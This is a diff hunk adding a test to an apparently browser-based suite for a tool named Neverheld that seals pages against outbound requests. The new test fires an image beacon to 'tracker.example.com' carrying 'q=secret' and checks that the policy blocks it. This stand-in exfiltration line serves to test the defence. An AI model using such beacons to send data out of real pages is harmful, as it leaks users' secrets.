@@ -290,6 +290,15 @@ await new Promise((resolveListen) => server.listen(0, "127.0.0.1", resolveListen
   assert.equal(await hints.evaluate(() => document.querySelectorAll("link[rel]").length), 0, "existing preconnect, dns-prefetch and modulepreload hints removed");
   await hints.context().close();
 
+  // R22: an image refused by the policy is a blocked attempt, not a request (Chromium also writes a timing entry for it).
+  const imagePage = await sealedPage("/egress");
+  await imagePage.evaluate(() => { new Image().src = "https://tracker.example.com/pixel.gif?q=secret"; });
+  await imagePage.waitForTimeout(800);
+  const imageStatus = await imagePage.evaluate(() => globalThis.Neverheld.getSealStatus());
+  assert.equal(imageStatus.requests, 0, `refused image not counted as a request: ${JSON.stringify(imageStatus.log)}`);
+  assert.ok(imageStatus.blocked >= 1, "refused image counted as blocked");
+  await imagePage.context().close();
+
   // R16: counting starts with enforcement, so an attempt inside the self-test window is counted.
   const boundary = await sealedPage("/boundary");
   await boundary.waitForTimeout(300);
